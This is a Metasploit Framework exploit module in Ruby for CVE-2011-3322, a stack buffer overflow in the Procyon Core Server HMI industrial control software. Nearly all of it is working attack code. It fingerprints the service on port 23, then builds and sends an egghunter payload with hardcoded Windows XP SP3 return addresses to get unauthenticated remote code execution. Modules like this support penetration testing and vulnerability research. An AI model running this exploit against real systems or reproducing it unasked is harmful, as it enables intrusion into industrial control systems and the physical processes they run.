# $Id: procyon_core_server.rb 13724 2011-09-12 21:42:36Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Egghunter
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Procyon Core Server HMI <= v1.13 Coreservice.exe Stack Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the coreservice.exe component of Proycon
                Core Server <= v1.13. While processing a password, the application
                fails to do proper bounds checking before copying data into a small buffer on the stack.
                This causes a buffer overflow and allows to overwrite a structured exception handling
                record on the stack, allowing for unauthenticated remote code execution.  Also, after the
                payload exits, Coreservice.exe should automatically recover.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13724 $&#039;,
            &#039;Author&#039;         =>
                [
                    &#039;Knud HÃ¸jgaard <keh[at]nsense.dk>&#039;,        # Initial discovery
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # Initial discovery & poc/msf
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;CVE-2011-3322&#039;],
                    [&#039;OSVDB&#039;, &#039;75371&#039;],
                    [&#039;URL&#039;, &#039;http://www.uscert.gov/control_systems/pdf/ICSA-11-216-01.pdf&#039;],
                    [&#039;URL&#039;, &#039;http://www.stratsec.net/Research/Advisories/Procyon-Core-Server-HMI-Remote-Stack-Overflow&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
 
                    [
                        &#039;Windows XP SP3 - No dep bypass&#039;,
                        {
                            &#039;Ret&#039;    => 0x774699bf, # JMP ESP [user32.dll]
                            &#039;Edx&#039;    => 0x1D847770, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]
                            &#039;Eax&#039;    => 0x01010106, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]
                            &#039;Offset&#039; => 8
                        }
                    ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DisclosureDate&#039; => "Sep 08 2011",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
            [
                Opt::RPORT(23)
            ], self.class)
    end
 
    def check
        connect
        res = sock.get_once.chomp  #This gives us string "----------------------------"
        res = sock.get_once.chomp  #This gives us the actual software version
        disconnect
 
        if res =~ /Core Command Interface V1\.(.*)2/
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
 
        eggoptions =
        {
            :checksum => false,
            :eggtag => &#039;ssec&#039;,
        }
 
        badchars = "\x00\x0a\x0d"
        hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)
 
        sploit = rand_text_alpha_upper(45)
        sploit << [target[&#039;Edx&#039;]].pack(&#039;V&#039;)
        sploit << [0x41414141].pack(&#039;V&#039;)
        sploit << [target[&#039;Eax&#039;]].pack(&#039;V&#039;)
        sploit << rand_text_alpha_upper(target[&#039;Offset&#039;])
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(10)
        sploit << hunter
        sploit << rand_text_alpha_upper(500)
        sploit << egg
        sploit << "\r\n"
 
        connect
        sock.get_once()
        print_status("Sending request...")
        sock.put(sploit)
        handler()
        disconnect
 
    end
 
end



